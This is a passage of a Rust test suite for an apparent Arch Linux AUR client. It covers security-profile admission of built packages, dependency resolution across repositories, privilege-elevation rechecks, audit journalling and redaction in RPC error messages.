                makeflags: String::new(),
                compiler_cache_dirs: Vec::new(),
                extra_env: Vec::new(),
                pgp_home: None,
            };
            let mut client = AurClient {
                build_dir: checkout.path().to_path_buf(),
                settings: Settings::default(),
                package_base_locks: Arc::new(dashmap::DashMap::new()),
            };
            let inspection = artifact_inspector::inspect_archive(&archive)?.into_inspection();
            for old_version in [3, 4, 5] {
                let mut old_policy = inspection.clone();
                old_policy.policy_version = old_version;
                assert_ne!(
                    client.paired_build_cache_key(&source, &env, std::slice::from_ref(&old_policy)),
                    client.paired_build_cache_key(&source, &env, std::slice::from_ref(&inspection)),
                    "a policy-{old_version} paired-build proof must not authorize the current archive policy"
                );
            }
            let standard_key =
                client.paired_build_cache_key(&source, &env, std::slice::from_ref(&inspection));
            client.settings.aur.security_profile = crate::config::AurSecurityProfile::Hardened;
            let hardened_key =
                client.paired_build_cache_key(&source, &env, std::slice::from_ref(&inspection));
            assert_ne!(
                standard_key, hardened_key,
                "a proof under one profile must not authorize another"
            );
            let error = client
                .authorize_with_paired_build(
                    std::slice::from_ref(&archive),
                    &source,
                    "demo",
                    &["demo".to_owned()],
                    &["demo".to_owned()],
                    true,
                    checkout.path(),
                    &env,
                )
                .await
                .expect_err("hardened admission must reject an install hook before rebuilding");
            assert!(
                error.to_string().contains("Hardened AUR profile rejects"),
                "{error:#}"
            );
            client.settings.aur.review_pkgbuild = false;
            let error = client
                .run_build(checkout.path(), &env, "demo", &source)
                .await
                .expect_err("an invalid hardened configuration must fail before running a build");
            assert!(
                error.to_string().contains("requires build_method"),
                "{error:#}"
            );
            Ok(())
        })
    })
}

#[test]
fn standard_admission_accepts_an_ordinary_archive_without_rebuild() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::standard_admission_accepts_an_ordinary_archive_without_rebuild";
    with_private_admission_fixture(TEST, |runtime, fixture| {
        runtime.block_on(async {
            let checkout = tempfile::tempdir_in(fixture)?;
            std::fs::write(checkout.path().join("PKGBUILD"), "pkgname=demo\n")
                .expect("write fixture file");
            std::fs::write(
                checkout.path().join(".SRCINFO"),
                "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\n",
            )
            .expect("write fixture file");
            let source = ReviewedSource::capture(checkout.path())?;
            let archives = tempfile::Builder::new()
                .permissions(std::fs::Permissions::from_mode(0o700))
                .tempdir_in(fixture)?;
            let archive = archives.path().join("demo-1-1-any.pkg.tar.gz");
            write_pkg_archive(
                &archive,
                "pkgname = demo\npkgbase = demo\npkgver = 1-1\n",
                None,
            );
            let invocation = tempfile::tempdir_in(fixture)?;
            let env = MakepkgEnv {
                pkgdest: invocation.path().join("pkg"),
                srcdest: invocation.path().join("src"),
                builddir: invocation.path().join("build"),
                _invocation: invocation,
                makeflags: String::new(),
                compiler_cache_dirs: Vec::new(),
                extra_env: Vec::new(),
                pgp_home: None,
            };
            let client = AurClient {
                build_dir: checkout.path().to_path_buf(),
                settings: Settings::default(),
                package_base_locks: Arc::new(dashmap::DashMap::new()),
            };
            let accepted = client
                .authorize_with_paired_build(
                    std::slice::from_ref(&archive),
                    &source,
                    "demo",
                    &["demo".to_owned()],
                    &["demo".to_owned()],
                    true,
                    checkout.path(),
                    &env,
                )
                .await?;
            assert_eq!(accepted.len(), 1);
            assert_eq!(
                artifact_inspector::inspect_archive(&accepted.archives[0].path())?
                    .into_inspection()
                    .package_name,
                "demo"
            );
            let journal = fixture.join("data/audit/audit.jsonl");
            assert!(
                journal.is_file(),
                "missing AUR inspection audit journal {journal:?}"
            );
            let audit = std::fs::read_to_string(&journal)?;
            assert!(audit.contains("aur_inspection"), "{audit}");
            assert!(audit.contains("succeeded"), "{audit}");
            Ok(())
        })
    })
}

#[test]
fn standard_build_is_rejected_after_current_profile_becomes_hardened() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::standard_build_is_rejected_after_current_profile_becomes_hardened";
    with_private_admission_fixture(TEST, |runtime, fixture| {
        runtime.block_on(async {
            let checkout = tempfile::tempdir_in(fixture)?;
            std::fs::write(checkout.path().join("PKGBUILD"), "pkgname=demo\n")
                .expect("write fixture file");
            std::fs::write(
                checkout.path().join(".SRCINFO"),
                "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\n",
            )
            .expect("write fixture file");
            let source = ReviewedSource::capture(checkout.path())?;
            let archives = tempfile::Builder::new()
                .permissions(std::fs::Permissions::from_mode(0o700))
                .tempdir_in(fixture)?;
            let archive = archives.path().join("demo-1-1-any.pkg.tar.gz");
            write_pkg_archive(
                &archive,
                "pkgname = demo\npkgbase = demo\npkgver = 1-1\n",
                None,
            );
            let invocation = tempfile::tempdir_in(fixture)?;
            let env = MakepkgEnv {
                pkgdest: invocation.path().join("pkg"),
                srcdest: invocation.path().join("src"),
                builddir: invocation.path().join("build"),
                _invocation: invocation,
                makeflags: String::new(),
                compiler_cache_dirs: Vec::new(),
                extra_env: Vec::new(),
                pgp_home: None,
            };
            let client = AurClient {
                build_dir: checkout.path().to_path_buf(),
                settings: Settings::default(),
                package_base_locks: Arc::new(dashmap::DashMap::new()),
            };
            let accepted = client
                .authorize_with_paired_build(
                    std::slice::from_ref(&archive),
                    &source,
                    "demo",
                    &["demo".to_owned()],
                    &["demo".to_owned()],
                    true,
                    checkout.path(),
                    &env,
                )
                .await?;
            let journal = fixture.join("data/audit/audit.jsonl");
            assert!(
                journal.is_file(),
                "missing AUR inspection audit journal {journal:?}"
            );
            let audit = std::fs::read_to_string(&journal)?;
            assert!(audit.contains("aur_inspection"), "{audit}");
            assert!(audit.contains("succeeded"), "{audit}");
            std::fs::write(
                fixture.join("config/config.toml"),
                "[aur]\nsecurity_profile = 'hardened'\n",
            )
            .expect("switch the isolated fixture to the Hardened AUR profile");
            let error = AurClient::install_built_packages(std::slice::from_ref(&accepted), None)
                .await
                .expect_err("standard build evidence must not satisfy the newly hardened profile");
            assert!(
                error
                    .to_string()
                    .contains("built under the Standard AUR profile"),
                "{error:#}"
            );
            let wave = [
                BuiltPackages {
                    archives: vec![ArchiveSnapshot::capture(&archive)?],
                    inspections: Vec::new(),
                    profile: AurSecurityProfile::Hardened,
                    requested_outputs: BTreeSet::from(["demo".to_owned()]),
                },
                accepted,
            ];
            let error = AurClient::install_built_packages(&wave, None)
                .await
                .expect_err("a hardened first batch must not authorize a standard second batch");
            assert!(
                error
                    .to_string()
                    .contains("built under the Standard AUR profile"),
                "{error:#}"
            );
            Ok(())
        })
    })
}

fn write_review_repository(
    database: &Path,
    repository: &str,
    version: &str,
    provided: &str,
) -> Result<()> {
    let desc = format!(
        "%NAME%\nhelper\n\n%VERSION%\n{version}\n\n%DESC%\nreview fixture\n\n%ARCH%\nany\n\n%PACKAGER%\nFixture Maintainer <fixture@example.invalid>\n\n%PROVIDES%\n{provided}\n\n"
    );
    let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    let mut archive = tar::Builder::new(encoder);
    let mut header = tar::Header::new_gnu();
    header.set_size(desc.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    archive
        .append_data(
            &mut header,
            format!("helper-{version}/desc"),
            desc.as_bytes(),
        )
        .expect("append the fixture package descriptor");
    std::fs::write(
        database.join("sync").join(format!("{repository}.db")),
        archive.into_inner()?.finish()?,
    )
    .expect("write the fixture sync database");
    Ok(())
}

#[test]
fn official_package_lookup_only_skips_a_missing_candidate() {
    use super::optional_official_package;

    assert_eq!(
        optional_official_package("core", "helper", Ok("helper"))
            .expect("a native lookup returned the package"),
        Some("helper")
    );
    assert_eq!(
        optional_official_package::<()>("core", "helper", Err(alpm::Error::PkgNotFound))
            .expect("a missing candidate allows lookup in the next repository"),
        None
    );
    let error = optional_official_package::<()>("core", "helper", Err(alpm::Error::DbInvalidSig))
        .expect_err("invalid repository signatures must stop reconciliation");
    assert_eq!(error.to_string(), "Failed to inspect 'core/helper'");
    assert_eq!(
        error.downcast_ref::<alpm::Error>(),
        Some(&alpm::Error::DbInvalidSig)
    );
}

#[test]
fn review_official_classification_requires_complete_install_catalog() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::review_official_classification_requires_complete_install_catalog";
    if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&[])?;
    std::fs::create_dir_all(fixture.db.join("local"))?;
    std::fs::write(fixture.db.join("local/ALPM_DB_VERSION"), "9\n")?;
    write_review_repository(&fixture.db, "low", "2-1", "virtual-helper=2")?;
    let alpm = alpm::Alpm::new(
        fixture
            .directory
            .path()
            .join("root")
            .to_str()
            .context("fixture root is not UTF-8")?,
        fixture
            .db
            .to_str()
            .context("fixture database is not UTF-8")?,
    )
    .expect("open the isolated AUR dependency database");
    let missing = alpm.register_syncdb("missing", alpm::SigLevel::NONE)?;
    missing.set_usage(alpm::Usage::SEARCH)?;
    alpm.register_syncdb("low", alpm::SigLevel::NONE)?;
    assert_eq!(
        resolve_official_dependency(&alpm, "helper>=2")?
            .context("low helper must be selected")?
            .repository,
        "low"
    );
    assert_eq!(resolve_official_dependency(&alpm, "aur-helper")?, None);
    missing.set_usage(alpm::Usage::INSTALL)?;
    for relation in ["aur-helper", "helper>=2"] {
        let error = resolve_official_dependency(&alpm, relation).expect_err(
            "an unavailable eligible repository cannot prove absence or select a lower repository",
        );
        assert!(
            format!("{error:#}").contains("missing"),
            "{relation}: {error:#}"
        );
    }
    std::fs::write(
        &fixture.conf,
        "[options]\nSigLevel = Never\n[missing]\n[low]\n",
    )
    .expect("write the fixture with an unavailable first-priority repository");
    std::fs::write(fixture.directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
    fixture.with_environment(async {
        S72Fixture::index(&["aur-helper"])?;
        let client = fixture.client();
        assert!(client.info("aur-helper").await?.is_some(), "same-named AUR candidate exists");
        std::fs::write(fixture.directory.path().join(".SRCINFO"), "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\ndepends = aur-helper\n")?;
        let error = client.aur_dependency_plan(&ReviewedSource::capture(fixture.directory.path())?, "demo", &["demo".to_owned()]).await
            .expect_err("incomplete official classification must fail before accepting the AUR candidate");
        assert!(format!("{error:#}").contains("missing"), "{error:#}");
        Ok(())
    })
}

#[test]
fn review_official_plan_combines_constraints_for_one_selected_identity() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::review_official_plan_combines_constraints_for_one_selected_identity";
    if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&[])?;
    std::fs::create_dir_all(fixture.db.join("local"))?;
    std::fs::write(fixture.db.join("local/ALPM_DB_VERSION"), "9\n")?;
    write_review_repository(&fixture.db, "high", "1-1", "virtual-helper=5")?;
    write_review_repository(&fixture.db, "low", "2-1", "virtual-helper=10")?;
    write_review_repository(&fixture.db, "search-only", "99-1", "virtual-helper=99")?;
    write_tar_gz(&fixture.db.join("sync/empty.db"), &[]);
    std::fs::write(
        &fixture.conf,
        "[options]\nSigLevel = Never\n[search-only]\nUsage = Search\n[empty]\n[high]\n[low]\n",
    )
    .expect("write the isolated repository usage order");
    std::fs::write(fixture.directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
    fixture.with_environment(async {
        let client = fixture.client();
        for relations in [["helper>=1", "helper>=2"], ["helper>=2", "virtual-helper>=10"], ["virtual-helper>=1", "virtual-helper>=10"]] {
            std::fs::write(fixture.directory.path().join(".SRCINFO"), format!("pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\ndepends = {}\ndepends = {}\n", relations[0], relations[1]))?;
            let plan = client.aur_dependency_plan(&ReviewedSource::capture(fixture.directory.path())?, "demo", &["demo".to_owned()]).await?;
            assert!(plan.aur_dependencies.is_empty(), "official relations must not fall back to AUR");
            assert_eq!(plan.official_dependencies, vec![OfficialTarget {
                repository: "low".to_owned(),
                name: "helper".to_owned(),
                relations: relations.map(str::to_owned).to_vec(),
            }], "all constraints must select one coherent package for {relations:?}");
            InstallRequest::new(plan.official_dependencies.into_iter().map(|selected| InstallItem {
                target: InstallTarget::Resolved(selected),
                intent: InstallIntent::Automatic,
            }).collect())?;
        }
        S72Fixture::index(&["aur-helper"])?;
        std::fs::write(fixture.directory.path().join(".SRCINFO"), "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\ndepends = aur-helper\n")?;
        let plan = client.aur_dependency_plan(&ReviewedSource::capture(fixture.directory.path())?, "demo", &["demo".to_owned()]).await?;
        assert!(plan.official_dependencies.is_empty());
        assert_eq!(plan.aur_dependencies, ["aur-helper"]);
        std::fs::write(fixture.directory.path().join(".SRCINFO"), "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\ndepends = helper<2\ndepends = helper>=2\n")?;
        client.aur_dependency_plan(&ReviewedSource::capture(fixture.directory.path())?, "demo", &["demo".to_owned()]).await
            .expect_err("contradictory constraints must fail closed before installation");
        Ok(())
    })
}

#[test]
fn review_queued_install_rechecks_current_profile_before_elevation() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::review_queued_install_rechecks_current_profile_before_elevation";
    if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST) {
        return Ok(());
    }
    let directory = private_fixture_dir()?;
    let configuration = directory.path().join("config.toml");
    let socket = directory.path().join("absent.sock");
    std::fs::write(&configuration, "[aur]\nsecurity_profile = 'standard'\n")?;
    let archive = directory.path().join("demo-1-1-any.pkg.tar.gz");
    write_pkg_archive(
        &archive,
        "pkgname = demo\npkgbase = demo\npkgver = 1-1\n",
        None,
    );
    let standard = BuiltPackages {
        archives: vec![ArchiveSnapshot::capture(&archive)?],
        inspections: Vec::new(),
        profile: AurSecurityProfile::Standard,
        requested_outputs: BTreeSet::from(["demo".to_owned()]),
    };
    temp_env::with_vars(
        [
            ("OMG_CONFIG_DIR", Some(directory.path().as_os_str())),
            ("OMG_CACHE_DIR", Some(directory.path().as_os_str())),
            ("OMG_SOCKET_PATH", Some(socket.as_os_str())),
            ("CARGO_PRIMARY_PACKAGE", Some(std::ffi::OsStr::new("1"))),
        ],
        || {
            tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()?
                .block_on(async {
                    let control =
                        AurClient::install_built_packages(std::slice::from_ref(&standard), None)
                            .await
                            .expect_err("the admitted Standard control reaches inert elevation");
                    assert!(
                        format!("{control:#}")
                            .contains("Privilege elevation not supported in development mode"),
                        "{control:#}"
                    );
                    let mut stopped = crate::core::sudoloop::SudoLoop::start();
                    stopped.stop();
                    assert!(!stopped.is_running());
                    let stopped_control = AurClient::install_built_packages(
                        std::slice::from_ref(&standard),
                        Some(&stopped),
                    )
                    .await
                    .expect_err("a stopped sudoloop must retain the inert elevation refusal");
                    assert!(
                        format!("{stopped_control:#}")
                            .contains("Privilege elevation not supported in development mode"),
                        "{stopped_control:#}"
                    );
                    let lock = INSTALL_LOCK.lock().await;
                    let mut install = Box::pin(AurClient::install_built_packages(
                        std::slice::from_ref(&standard),
                        None,
                    ));
                    assert!(
                        futures::poll!(install.as_mut()).is_pending(),
                        "the validated Standard batch must wait for INSTALL_LOCK"
                    );
                    std::fs::write(&configuration, "[aur]\nsecurity_profile = 'hardened'\n")?;
                    drop(lock);
                    let error = install.await.expect_err(
                        "queued Standard evidence must fail under the newly Hardened profile",
                    );
                    assert!(
                        format!("{error:#}").contains("built under the Standard AUR profile"),
                        "{error:#}"
                    );
                    Ok(())
                })
        },
    )
}

#[test]
fn official_dependency_selection_preserves_native_repository_and_relation() -> Result<()> {
    let directory = tempfile::tempdir()?;
    let root = directory.path().join("root");
    let database = directory.path().join("db");
    std::fs::create_dir_all(&root)?;
    std::fs::create_dir_all(database.join("sync"))?;
    for (repository, version) in [("high", "1-1"), ("low", "2-1")] {
        let desc = format!(
            "%NAME%\nhelper\n\n%VERSION%\n{version}\n\n%DESC%\nselected identity fixture\n\n%ARCH%\nany\n\n%PACKAGER%\nFixture Maintainer <fixture@example.invalid>\n\n%PROVIDES%\nvirtual-helper={version}\n\n"
        );
        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        let mut archive = tar::Builder::new(encoder);
        let mut header = tar::Header::new_gnu();
        header.set_size(desc.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        archive
            .append_data(
                &mut header,
                format!("helper-{version}/desc"),
                desc.as_bytes(),
            )
            .expect("append the versioned fixture package descriptor");
        std::fs::write(
            database.join("sync").join(format!("{repository}.db")),
            archive.into_inner()?.finish()?,
        )
        .expect("write the versioned fixture sync database");
    }
    let alpm = alpm::Alpm::new(
        root.to_str().context("fixture root is not UTF-8")?,
        database.to_str().context("fixture database is not UTF-8")?,
    )
    .expect("open the versioned AUR dependency fixture database");
    alpm.register_syncdb("high", alpm::SigLevel::NONE)?;
    alpm.register_syncdb("low", alpm::SigLevel::NONE)?;
    for (relation, repository) in [
        ("helper", "high"),
        ("helper>=2", "low"),
        ("virtual-helper>=2", "low"),
    ] {
        assert_eq!(
            resolve_official_dependency(&alpm, relation)?,
            Some(OfficialTarget {
                repository: repository.to_owned(),
                name: "helper".to_owned(),
                relations: vec![relation.to_owned()],
            }),
            "native selection for {relation}"
        );
    }
    assert_eq!(resolve_official_dependency(&alpm, "helper>=3")?, None);
    Ok(())
}

#[tokio::test]
#[ignore = "requires an explicitly provisioned disposable native Arch fixture"]
async fn batch2_native_automatic_dependency_reason() -> Result<()> {
    anyhow::ensure!(
        std::env::var("OMG_ARCH_INSTALL_FIXTURE").as_deref() == Ok("isolated-container"),
        "OMG_ARCH_INSTALL_FIXTURE=isolated-container is required"
    );
    anyhow::ensure!(crate::core::is_root(), "guest fixture requires root");
    let directory = tempfile::tempdir()?;
    let root = directory.path().join("root");
    let database = directory.path().join("db");
    let cache = root.join("var/cache/pacman/pkg");
    for path in [
        root.join("etc/pacman.d/gnupg"),
        database.join("local"),
        database.join("sync"),
        cache.clone(),
    ] {
        std::fs::create_dir_all(path)?;
    }
    std::fs::write(database.join("local/ALPM_DB_VERSION"), "9\n")?;
    let filename = "helper-2-1-any.pkg.tar.gz";
    let package = cache.join(filename);
    write_pkg_archive(
        &package,
        "pkgname = helper\npkgbase = helper\npkgver = 2-1\n",
        None,
    );
    let bytes = std::fs::read(&package)?;
    let desc = format!(
        "%NAME%\nhelper\n\n%VERSION%\n2-1\n\n%DESC%\ninert automatic dependency fixture\n\n%ARCH%\nany\n\n%PACKAGER%\nFixture Maintainer <fixture@example.invalid>\n\n%FILENAME%\n{filename}\n\n%CSIZE%\n{}\n\n%ISIZE%\n0\n\n%SHA256SUM%\n{}\n\n",
        bytes.len(),
        hex::encode(Sha256::digest(&bytes))
    );
    write_tar_gz(
        &database.join("sync/omg-fixture.db"),
        &[("helper-2-1/desc", desc.as_bytes())],
    );
    let configuration = directory.path().join("pacman.conf");
    std::fs::write(
        &configuration,
        format!(
            "[options]\nArchitecture = auto\nSigLevel = Never\n[omg-fixture]\nSigLevel = Never\nServer = file://{}\n",
            cache.display()
        ),
    )
    .expect("write the isolated official-dependency configuration");
    nix::sched::unshare(nix::sched::CloneFlags::CLONE_NEWNS)?;
    assert!(
        std::process::Command::new("mount")
            .args(["--make-rprivate", "/"])
            .status()?
            .success()
    );
    assert!(
        std::process::Command::new("mount")
            .arg("--bind")
            .arg(&configuration)
            .arg("/etc/pacman.conf")
            .status()?
            .success()
    );
    crate::core::paths::set_test_overrides(Some(root.clone()), Some(database.clone()));
    let open_fixture = || {
        alpm::Alpm::new(
            root.to_str().expect("fixture root must be UTF-8"),
            database
                .to_str()
                .expect("fixture database path must be UTF-8"),
        )
        .expect("open the isolated package database to observe install reasons")
    };
    let before = open_fixture();
    assert_eq!(before.localdb().pkgs().len(), 0);
    drop(before);
    let selected = crate::package_managers::alpm_direct::with_handle(|alpm| {
        resolve_official_dependency(alpm, "helper>=2")?
            .context("fixture helper is absent from sync repositories")
    })
    .expect("resolve the official dependency from the isolated repository");
    assert_eq!(selected.repository, "omg-fixture");
    AurClient::install_official_dependencies(std::slice::from_ref(&selected)).await?;
    let after = open_fixture();
    assert_eq!(after.localdb().pkgs().len(), 1);
    assert_eq!(
        after.localdb().pkg("helper")?.reason(),
        alpm::PackageReason::Depend,
        "new official AUR build dependencies must remain eligible for orphan cleanup"
    );
    drop(after);
    use crate::package_managers::traits::PackageManager;
    crate::package_managers::ArchPackageManager::new()
        .install(&["omg-fixture/helper".to_owned()])
        .await?;
    AurClient::install_official_dependencies(&[selected]).await?;
    let promoted = open_fixture();
    assert_eq!(
        promoted.localdb().pkg("helper")?.reason(),
        alpm::PackageReason::Explicit,
        "an automatic build dependency request must preserve an existing explicit reason"
    );
    drop(promoted);
    let mut archives = Vec::new();
    for name in ["omg-fixture-app", "omg-fixture-libs"] {
        let archive = directory.path().join(format!("{name}-1-1-any.pkg.tar.gz"));
        write_pkg_archive(
            &archive,
            &format!("pkgname = {name}\npkgbase = omg-fixture-split\npkgver = 1-1\n"),
            None,
        );
        archives.push(ArchiveSnapshot::capture(&archive)?);
    }
    let mut batch = BuiltPackages {
        archives,
        inspections: Vec::new(),
        profile: AurSecurityProfile::Hardened,
        requested_outputs: BTreeSet::from(["omg-fixture-app".to_owned()]),
    };
    AurClient::install_built_packages(std::slice::from_ref(&batch), None).await?;
    let installed = || {
        let alpm = open_fixture();
        let mut packages = alpm
            .localdb()
            .pkgs()
            .iter()
            .map(|package| (package.name().to_owned(), package.reason()))
            .collect::<Vec<_>>();
        packages.sort_by(|left, right| left.0.cmp(&right.0));
        packages
    };
    use alpm::PackageReason::{Depend, Explicit};
    assert_eq!(
        installed(),
        vec![
            ("helper".to_owned(), Explicit),
            ("omg-fixture-app".to_owned(), Explicit),
            ("omg-fixture-libs".to_owned(), Depend),
        ],
        "only requested outputs from an admitted build batch become explicit"
    );
    batch.requested_outputs.clear();
    AurClient::install_built_packages(std::slice::from_ref(&batch), None).await?;
    assert_eq!(
        installed()[1].1,
        Explicit,
        "an automatic rebuild must not demote an existing explicit split output"
    );
    batch
        .requested_outputs
        .insert("omg-fixture-libs".to_owned());
    AurClient::install_built_packages(std::slice::from_ref(&batch), None).await?;
    assert!(installed().iter().all(|(_, reason)| *reason == Explicit));
    Ok(())
}

#[test]
fn final_install_rechecks_current_hardened_profile_before_elevation() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::final_install_rechecks_current_hardened_profile_before_elevation";
    if Settings::rerun_test_unprivileged(TEST) || crate::core::testing::run_isolated_test(TEST) {
        return Ok(());
    }
    let directory = private_fixture_dir()?;
    let archive = directory.path().join("demo-1-1-any.pkg.tar.gz");
    write_pkg_archive(
        &archive,
        "pkgname = demo\npkgbase = demo\npkgver = 1-1\narch = any\n",
        Some("post_install() { :; }\n"),
    );
    let snapshot = ArchiveSnapshot::capture(&archive)?;
    std::fs::write(
        directory.path().join("config.toml"),
        "[aur]\nsecurity_profile = 'hardened'\n",
    )
    .expect("write fixture file");
    temp_env::with_var("OMG_CONFIG_DIR", Some(directory.path()), || {
        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()?;
        let error = runtime
            .block_on(AurClient::install_built_packages(
                &[BuiltPackages {
                    archives: vec![snapshot],
                    inspections: Vec::new(),
                    profile: AurSecurityProfile::Hardened,
                    requested_outputs: BTreeSet::from(["demo".to_owned()]),
                }],
                None,
            ))
            .expect_err("the current hardened profile must reject hooks before elevation");
        assert!(
            error.to_string().contains("Hardened AUR profile rejects"),
            "{error:#}"
        );
        Ok(())
    })
}

#[test]
fn sandbox_build_root_keeps_existing_mounts_visible_and_identity_stable() -> Result<()> {
    let first = [
        Path::new("/omg-build/checkout"),
        Path::new("/cache/first/packages"),
    ];
    let second = [
        Path::new("/omg-build/checkout"),
        Path::new("/cache/second/packages"),
    ];
    let root = sandbox_build_root(&first)?;
    for destination in first {
        let diagnostic = format!(
            "build root {} must not obscure mount {}",
            root.display(),
            destination.display()
        );
        assert!(
            !destination.starts_with(&root) && !root.starts_with(destination),
            "{diagnostic}"
        );
    }
    assert_eq!(root, sandbox_build_root(&second)?);
    assert_eq!(
        sandbox_build_root(&[Path::new("/omg-builder/cache")])?,
        Path::new(SANDBOX_BUILD_ROOT)
    );
    assert!(sandbox_build_root(&[Path::new("/")]).is_err());
    Ok(())
}

#[test]
fn paired_output_verification_is_order_independent_and_exact() {
    let first = vec![paired_fixture("app", "aa"), paired_fixture("libs", "bb")];
    let reversed = vec![paired_fixture("libs", "bb"), paired_fixture("app", "aa")];
    AurClient::verify_paired_outputs(&first, &reversed).expect("same exact outputs");

    let changed = vec![paired_fixture("app", "aa"), paired_fixture("libs", "cc")];
    let error = AurClient::verify_paired_outputs(&first, &changed)
        .expect_err("one changed byte hash must reject the pair");
    assert!(error.to_string().contains("byte-for-byte"));
}

#[test]
fn reproducible_epoch_is_stable_and_rejects_invalid_digests() {
    let digest = "0123456789abcdef".repeat(4);
    let first = reproducible_source_epoch(&digest).expect("valid source digest");
    let second = reproducible_source_epoch(&digest).expect("same source digest");
    assert_eq!(first, second);
    assert!(first.parse::<u64>().is_ok());
    assert!(reproducible_source_epoch("short").is_err());
    assert!(reproducible_source_epoch("not-a-valid-hash!").is_err());
}

mod empty_rpc_result_tests {
    use super::super::AurClient;
    use anyhow::Result;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    #[tokio::test]
    async fn empty_info_reply_is_a_real_completed_rpc_lookup() -> Result<()> {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let endpoint = format!("http://{}/rpc", listener.local_addr()?);
        let server = tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await?;
            let mut bytes = Vec::new();
            while !bytes.windows(4).any(|window| window == b"\r\n\r\n") {
                anyhow::ensure!(bytes.len() < 8192, "RPC fixture header exceeds 8 KiB");
                let mut chunk = [0; 1024];
                let count = stream
                    .read(&mut chunk[..(8192 - bytes.len()).min(1024)])
                    .await?;
                anyhow::ensure!(count > 0, "RPC fixture closed before complete header");
                bytes.extend_from_slice(&chunk[..count]);
            }
            let request = String::from_utf8(bytes)?;
            let body = r#"{"type":"multiinfo","resultcount":0,"results":[]}"#;
            let reply = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            );
            stream.write_all(reply.as_bytes()).await?;
            anyhow::Ok(request)
        });
        let response = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            AurClient::rpc_info_chunk_at(&endpoint, &["missing-fixture-package".to_owned()]),
        )
        .await??;
        let request = server.await??;
        assert!(request.starts_with("GET /rpc?v=5&type=info&"), "{request}");
        assert!(request.contains("missing-fixture-package"), "{request}");
        assert!(
            response.results.is_empty(),
            "empty successful info is absence, not a transport error"
        );
        eprintln!(
            "AUR empty-info completed request={}",
            request.lines().next().unwrap_or_default()
        );
        Ok(())
    }
}

#[cfg(test)]
mod update_error_tests {
    use super::*;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    async fn update_error_from_reply(
        reply: Option<&[u8]>,
        attempts: usize,
    ) -> Result<anyhow::Error> {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let endpoint = format!("http://{}/rpc", listener.local_addr()?);
        let reply = reply.map(<[u8]>::to_vec);
        let server = tokio::spawn(async move {
            for _ in 0..attempts {
                let (mut stream, _) = listener.accept().await?;
                let mut request = Vec::new();
                while !request.windows(4).any(|window| window == b"\r\n\r\n") {
                    anyhow::ensure!(request.len() < 8192, "fixture request too large");
                    let mut buffer = [0; 1024];
                    let count = stream.read(&mut buffer).await?;
                    anyhow::ensure!(count > 0, "fixture request incomplete");
                    request.extend_from_slice(&buffer[..count]);
                }
                if let Some(reply) = &reply {
                    stream.write_all(reply).await?;
                }
                stream.shutdown().await?;
            }
            anyhow::Ok(())
        });
        let client = AurClient {
            build_dir: PathBuf::new(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let result = tokio::time::timeout(
            Duration::from_secs(5),
            client.query_aur_updates_at(
                &endpoint,
                &["private-package-query".to_owned()],
                Arc::new(HashMap::new()),
            ),
        )
        .await?;
        tokio::time::timeout(Duration::from_secs(5), server).await???;
        let error = result.expect_err("failed RPC must fail update discovery");
        for cause in error.chain() {
            let message = cause.to_string();
            assert!(!message.contains("private-package-query"), "{message}");
            assert!(!message.contains("remote-secret"), "{message}");
            assert!(!message.contains(&endpoint), "{message}");
        }
        Ok(error)
    }

    #[tokio::test]
    async fn rate_limited_updates_preserve_http_cause_and_cooldown_guidance() -> Result<()> {
        let error = update_error_from_reply(Some(
        b"HTTP/1.1 429 Too Many Requests\r\nContent-Length: 13\r\nConnection: close\r\n\r\nremote-secret",
    ), 3)
    .await?;
        assert!(update_source_unavailable(&error));
        assert_eq!(
            crate::core::error::suggest_for_anyhow(&error),
            Some("Wait for the cooldown period, then retry your request")
        );
        assert!(format!("{error:#}").contains("HTTP 429"), "{error:#}");
        Ok(())
    }

    #[tokio::test]
    async fn failed_update_transport_preserves_redaction_and_network_guidance() -> Result<()> {
        let error = update_error_from_reply(None, 1).await?;
        assert!(update_source_unavailable(&error));
        assert_eq!(
            crate::core::error::suggest_for_anyhow(&error),
            Some("Check your internet connection and try again")
        );
        assert!(
            format!("{error:#}").contains("AUR RPC transport failed"),
            "{error:#}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn failed_update_http_status_does_not_invent_network_guidance() -> Result<()> {
        let error = update_error_from_reply(Some(
        b"HTTP/1.1 503 Service Unavailable\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
    ), 3).await?;
        assert!(update_source_unavailable(&error));
